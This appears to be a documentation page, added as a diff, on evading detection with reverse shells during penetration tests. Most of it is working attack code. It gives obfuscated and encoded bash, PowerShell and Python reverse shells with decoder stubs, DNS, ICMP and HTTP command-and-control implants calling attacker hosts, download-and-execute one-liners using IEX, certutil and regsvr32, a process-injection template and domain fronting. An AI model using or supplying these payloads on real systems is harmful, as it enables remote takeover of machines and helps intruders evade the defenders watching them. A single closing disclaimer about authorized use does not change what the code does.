@@ -1,0 +1,558 @@
+---
+title: Reverse Shell Evasion Techniques
+description: Methods to bypass security controls and avoid detection when using reverse shells
+---
+
+# Reverse Shell Evasion Techniques
+
+This section explores methods to bypass security controls and avoid detection when using reverse shells during authorized penetration testing. Understanding these techniques is crucial for both offensive security professionals and defenders.
+
+## Understanding Detection Mechanisms
+
+Before discussing evasion techniques, it's important to understand how reverse shells are typically detected:
+
+<Tabs defaultValue="network" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="network">Network Detection</TabsTrigger>
+    <TabsTrigger value="host">Host-Based Detection</TabsTrigger>
+    <TabsTrigger value="behavioral">Behavioral Analysis</TabsTrigger>
+  </TabsList>
+  <TabsContent value="network">
+    **Network-based detection** focuses on identifying suspicious network traffic:
+    
+    - **Signature-based detection**: Matching known patterns of reverse shell traffic
+    - **Anomaly detection**: Identifying unusual connection patterns or protocols
+    - **Traffic analysis**: Examining packet headers, connection frequency, and data transfer patterns
+    - **DPI (Deep Packet Inspection)**: Analyzing packet contents for suspicious commands or encodings
+  </TabsContent>
+  <TabsContent value="host">
+    **Host-based detection** looks for suspicious activities on the endpoint:
+    
+    - **Process monitoring**: Detecting unusual process creation or relationships
+    - **Command-line logging**: Identifying suspicious command parameters
+    - **File system monitoring**: Detecting creation of suspicious files or scripts
+    - **Memory scanning**: Identifying malicious code running in memory
+    - **API call monitoring**: Detecting suspicious system API calls
+  </TabsContent>
+  <TabsContent value="behavioral">
+    **Behavioral analysis** examines the overall patterns of activity:
+    
+    - **User behavior analytics**: Detecting actions that deviate from normal user patterns
+    - **Process lineage**: Analyzing parent-child process relationships
+    - **Resource utilization**: Monitoring for unusual CPU, memory, or network usage
+    - **Timing analysis**: Detecting periodic beaconing or connection attempts
+    - **Contextual analysis**: Correlating multiple low-confidence indicators
+  </TabsContent>
+</Tabs>
+
+## Obfuscation Techniques
+
+Obfuscation modifies the appearance of reverse shell code to evade signature-based detection.
+
+### String Obfuscation
+
+<Tabs defaultValue="powershell" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="powershell">PowerShell</TabsTrigger>
+    <TabsTrigger value="bash">Bash</TabsTrigger>
+    <TabsTrigger value="python">Python</TabsTrigger>
+  </TabsList>
+  <TabsContent value="powershell">
+    ```powershell
+    # Original suspicious string
+    # $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444)
+    
+    # Obfuscated version
+    $t = 'TCPClient'
+    $s = 'System.Net.Sockets'
+    $ip = '10.10.10.10'.Split('.') -join('.')
+    $port = [string]::Join('', ((4..5 | ForEach-Object {4})))
+    $cl = New-Object ($s+'.'+$t)($ip,[int]$port)
+    ```
+  </TabsContent>
+  <TabsContent value="bash">
+    ```bash
+    # Original suspicious command
+    # bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+    
+    # Obfuscated version
+    IP=$(echo "MTAuMTAuMTAuMTA=" | base64 -d)
+    PORT=$(echo "NDQ0NA==" | base64 -d)
+    SHELL=$(echo "YmFzaA==" | base64 -d)
+    $SHELL -i >& /dev/tcp/$IP/$PORT 0>&1
+    ```
+  </TabsContent>
+  <TabsContent value="python">
+    ```python
+    # Original suspicious code
+    # import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    
+    # Obfuscated version
+    ____ = __import__('socket')
+    _____ = __import__('subprocess')
+    ______ = __import__('os')
+    _ = getattr(____, 'socket')
+    __ = getattr(____, 'AF_INET')
+    ___ = getattr(____, 'SOCK_STREAM')
+    ____ = _(__, ___)
+    ```
+  </TabsContent>
+</Tabs>
+
+### Command Splitting and Reassembly
+
+Breaking commands into smaller pieces that are reassembled at runtime:
+
+```bash
+# Original command
+# bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+
+# Split and reassembled
+c1="ba"
+c2="sh -i"
+c3=" >& /dev/t"
+c4="cp/10.10.10.10/44"
+c5="44 0>&1"
+eval "$c1$c2$c3$c4$c5"
+```
+
+### Environment Variable Usage
+
+Using environment variables to store parts of the command:
+
+```bash
+export IP=10.10.10.10
+export PORT=4444
+bash -i >& /dev/tcp/$IP/$PORT 0>&1
+```
+
+## Encoding and Encryption
+
+Encoding and encryption help disguise the content of reverse shell traffic and payloads.
+
+### Base64 Encoding
+
+<Tabs defaultValue="powershell" className="pt-5 pb-1">
+  <TabsList>
+    <TabsTrigger value="powershell">PowerShell</TabsTrigger>
+    <TabsTrigger value="bash">Bash</TabsTrigger>
+    <TabsTrigger value="python">Python</TabsTrigger>
+  </TabsList>
+  <TabsContent value="powershell">
+    ```powershell
+    # Original PowerShell reverse shell
+    # $client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+    
+    # Base64 encoded version
+    $encoded = "JGNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5Tb2NrZXRzLlRDUENsaWVudCgiMTAuMTAuMTAuMTAiLDQ0NDQpOyRzdHJlYW0gPSAkY2xpZW50LkdldFN0cmVhbSgpO1tieXRlW11dJGJ5dGVzID0gMC4uNjU1MzV8JXswfTt3aGlsZSgoJGkgPSAkc3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApezskZGF0YSA9IChOZXctT2JqZWN0IC1UeXBlTmFtZSBTeXN0ZW0uVGV4dC5BU0NJSUVuY29kaW5nKS5HZXRTdHJpbmcoJGJ5dGVzLDAsICRpKTskc2VuZGJhY2sgPSAoaWV4ICRkYXRhIDI+JjEgfCBPdXQtU3RyaW5nICk7JHNlbmRiYWNrMiA9ICRzZW5kYmFjayArICJQUyAiICsgKHB3ZCkuUGF0aCArICI+ICI7JHNlbmRieXRlID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKCRzZW5kYmFjazIpOyRzdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHN0cmVhbS5GbHVzaCgpfTskY2xpZW50LkNsb3NlKCk="
+    powershell -EncodedCommand $encoded
+    ```
+  </TabsContent>
+  <TabsContent value="bash">
+    ```bash
+    # Original bash reverse shell
+    # bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
+    
+    # Base64 encoded version
+    echo "YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE=" | base64 -d | bash
+    ```
+  </TabsContent>
+  <TabsContent value="python">
+    ```python
+    # Original Python reverse shell
+    # import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])
+    
+    # Base64 encoded version
+    import base64
+    exec(base64.b64decode("aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjEwLjEwIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApO29zLmR1cDIocy5maWxlbm8oKSwxKTtvcy5kdXAyKHMuZmlsZW5vKCksMik7c3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9zaCIsIi1pIl0p").decode())
+    ```
+  </TabsContent>
+</Tabs>
+
+### XOR Encoding
+
+XOR encoding provides a simple form of encryption that can bypass basic signature detection:
+
+```python
+# Python implementation of XOR encoding for a reverse shell
+def xor_encode(data, key):
+    return ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(data))
+
+# Original payload
+payload = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# XOR key
+key = 'SECRET'
+
+# Encode the payload
+encoded = xor_encode(payload, key)
+
+# Decoder stub (to be executed on target)
+decoder = f'''
+encoded = "{encoded}"
+key = "{key}"
+exec(''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(encoded)))
+'''
+```
+
+### Custom Encryption
+
+Implementing custom encryption algorithms to evade detection:
+
+```python
+# Simple AES encryption for Python reverse shell
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad, unpad
+import base64
+import os
+
+# Original payload
+payload = 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
+
+# Generate random key and IV
+key = os.urandom(16)  # 128-bit key
+iv = os.urandom(16)   # 128-bit IV
+
+# Encrypt the payload
+cipher = AES.new(key, AES.MODE_CBC, iv)
+encrypted = cipher.encrypt(pad(payload.encode(), AES.block_size))
+encoded = base64.b64encode(encrypted).decode()
+
+# Key and IV as base64
+key_b64 = base64.b64encode(key).decode()
+iv_b64 = base64.b64encode(iv).decode()
+
+# Decoder stub (to be executed on target)
+decoder = f'''
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import unpad
+import base64
+
+key = base64.b64decode("{key_b64}")
+iv = base64.b64decode("{iv_b64}")
+encrypted = base64.b64decode("{encoded}")
+
+cipher = AES.new(key, AES.MODE_CBC, iv)
+decrypted = unpad(cipher.decrypt(encrypted), AES.block_size).decode()
+exec(decrypted)
+'''
+```
+
+## Alternative Communication Channels
+
+Using uncommon protocols or channels can help evade network monitoring systems focused on traditional communication methods.
+
+### DNS Tunneling
+
+Using DNS queries and responses to tunnel command and control traffic:
+
+```python
+# Python DNS tunneling reverse shell (simplified concept)
+import socket
+import subprocess
+import base64
+import time
+import random
+import string
+
+def encode_command_output(output):
+    # Encode output as base64 and split into chunks for DNS queries
+    encoded = base64.b64encode(output.encode()).decode()
+    chunks = [encoded[i:i+30] for i in range(0, len(encoded), 30)]
+    return chunks
+
+def make_dns_request(subdomain, domain):
+    try:
+        # Make a DNS request
+        socket.gethostbyname(f"{subdomain}.{domain}")
+    except:
+        pass
+
+def main():
+    c2_domain = "attacker-domain.com"
+    
+    while True:
+        try:
+            # In a real implementation, this would retrieve commands from DNS TXT records
+            command = "whoami"  # Placeholder
+            
+            # Execute command
+            output = subprocess.getoutput(command)
+            
+            # Encode and send output via DNS
+            chunks = encode_command_output(output)
+            for i, chunk in enumerate(chunks):
+                # Add random string to prevent caching
+                random_str = ''.join(random.choices(string.ascii_lowercase, k=5))
+                make_dns_request(f"{i}.{chunk}.{random_str}", c2_domain)
+                time.sleep(1)
+        except:
+            pass
+        
+        time.sleep(30)
+
+if __name__ == "__main__":
+    main()
+```
+
+### ICMP Tunneling
+
+Using ICMP echo (ping) packets to carry reverse shell traffic:
+
+```python
+# Python ICMP tunneling concept
+from scapy.all import *
+import subprocess
+
+def send_icmp_data(data, dst_ip):
+    # Split data into chunks
+    chunks = [data[i:i+32] for i in range(0, len(data), 32)]
+    
+    # Send data via ICMP echo packets
+    for i, chunk in enumerate(chunks):
+        pkt = IP(dst=dst_ip)/ICMP(type=8, seq=i)/Raw(load=chunk)
+        send(pkt, verbose=0)
+        time.sleep(0.5)
+
+def main():
+    attacker_ip = "10.10.10.10"
+    
+    while True:
+        try:
+            # Execute a command (in a real implementation, this would come from the attacker)
+            command = "whoami"
+            output = subprocess.getoutput(command)
+            
+            # Send the output back via ICMP
+            send_icmp_data(output, attacker_ip)
+        except:
+            pass
+        
+        time.sleep(30)
+
+if __name__ == "__main__":
+    main()
+```
+
+### HTTP/S Tunneling
+
+Using legitimate HTTP/S traffic to hide reverse shell communications:
+
+```python
+# Python HTTP reverse shell
+import requests
+import subprocess
+import time
+import base64
+import random
+import platform
+import os
+
+def execute_command(command):
+    return subprocess.getoutput(command)
+
+def main():
+    c2_server = "https://legitimate-looking-site.com/api/data"
+    agent_id = ''.join(random.choices('0123456789abcdef', k=8))
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "X-Session-ID": agent_id
+    }
+    
+    system_info = {
+        "hostname": platform.node(),
+        "os": platform.system(),
+        "version": platform.version(),
+        "architecture": platform.machine(),
+        "username": os.getlogin()
+    }
+    
+    # Initial check-in
+    requests.post(
+        c2_server, 
+        headers=headers,
+        json={"type": "registration", "data": system_info}
+    )
+    
+    while True:
+        try:
+            # Get command from C2
+            response = requests.get(c2_server, headers=headers)
+            
+            if response.status_code == 200 and response.json().get("command"):
+                command = base64.b64decode(response.json()["command"]).decode()
+                
+                # Execute command
+                output = execute_command(command)
+                
+                # Send result back
+                requests.post(
+                    c2_server,
+                    headers=headers,
+                    json={"type": "result", "data": base64.b64encode(output.encode()).decode()}
+                )
+        except:
+            pass
+            
+        # Random sleep to avoid predictable patterns
+        time.sleep(random.uniform(30, 60))
+
+if __name__ == "__main__":
+    main()
+```
+
+## Bypassing Antivirus and EDR
+
+Modern security solutions use various techniques to detect and block reverse shells. Here are methods to bypass them.
+
+### In-Memory Execution
+
+Executing code directly in memory without writing to disk:
+
+```powershell
+# PowerShell reflective loading
+$code = (New-Object Net.WebClient).DownloadString('http://attacker-ip/payload.ps1')
+IEX $code
+```
+
+### Process Injection
+
+Injecting the reverse shell into a legitimate process:
+
+```csharp
+// C# process injection concept
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+class ProcessInjection
+{
+    [DllImport("kernel32.dll")]
+    static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+    
+    [DllImport("kernel32.dll")]
+    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
+    
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    
+    static void Main(string[] args)
+    {
+        // Target process to inject into
+        Process targetProcess = Process.GetProcessesByName("notepad")[0];
+        
+        // Shellcode for a reverse shell (example)
+        byte[] shellcode = new byte[] { /* shellcode bytes here */ };
+        
+        // Open target process
+        IntPtr hProcess = OpenProcess(0x1F0FFF, false, targetProcess.Id);
+        
+        // Allocate memory in target process
+        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
+        
+        // Write shellcode to allocated memory
+        UIntPtr bytesWritten;
+        WriteProcessMemory(hProcess, addr, shellcode, (uint)shellcode.Length, out bytesWritten);
+        
+        // Create remote thread to execute shellcode
+        CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+    }
+}
+```
+
+### Living Off the Land
+
+Using legitimate system tools and binaries to establish reverse shells:
+
+```powershell
+# Using certutil to download a payload
+certutil -urlcache -split -f "http://attacker-ip/payload.txt" C:\Windows\Temp\payload.txt
+
+# Using regsvr32 to execute a scriptlet
+regsvr32 /s /u /i:http://attacker-ip/payload.sct scrobj.dll
+```
+
+## Evading Network Security Controls
+
+Bypassing network security controls that might block or detect reverse shell traffic.
+
+### Port Selection
+
+Choosing ports that are commonly allowed through firewalls:
+
+- **Port 80/443**: HTTP/HTTPS traffic
+- **Port 53**: DNS traffic
+- **Port 123**: NTP traffic
+- **Port 389/636**: LDAP/LDAPS traffic
+- **Port 25/587/465**: SMTP/Submission/SMTPS traffic
+
+### Traffic Shaping
+
+Modifying traffic patterns to appear more legitimate:
+
+```python
+# Python reverse shell with randomized timing
+import socket
+import subprocess
+import time
+import random
+import os
+
+def main():
+    host = "10.10.10.10"
+    port = 443  # Using HTTPS port
+    
+    while True:
+        try:
+            # Connect to C2
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((host, port))
+            
+            # Set up shell
+            os.dup2(s.fileno(), 0)
+            os.dup2(s.fileno(), 1)
+            os.dup2(s.fileno(), 2)
+            
+            # Execute shell
+            p = subprocess.call(["/bin/sh", "-i"])
+            
+        except:
+            # Random backoff to avoid predictable patterns
+            backoff = random.uniform(30, 300)  # 30 seconds to 5 minutes
+            time.sleep(backoff)
+
+if __name__ == "__main__":
+    main()
+```
+
+### Domain Fronting
+
+Using trusted domains as proxies to hide the true destination of traffic:
+
+```python
+# Python domain fronting concept
+import requests
+
+# Configuration
+front_domain = "trusted-cdn.com"  # A trusted domain that supports fronting
+actual_c2 = "attacker-controlled-domain.com"  # Your actual C2 server
+
+# Headers that specify the actual backend
+headers = {
+    "Host": actual_c2,
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+}
+
+# The request goes to the front domain but is forwarded to the actual C2
+response = requests.get(f"https://{front_domain}/path", headers=headers)
+```
+
+## Conclusion
+
+Evasion techniques are constantly evolving in response to improving detection capabilities. When conducting authorized penetration tests, it's important to understand these techniques both to effectively test security controls and to provide valuable recommendations for improving defenses.
+
+Remember that these techniques should only be used in legal, authorized penetration testing scenarios with proper documentation and approval. Unauthorized use of reverse shells with evasion techniques is illegal and unethical.
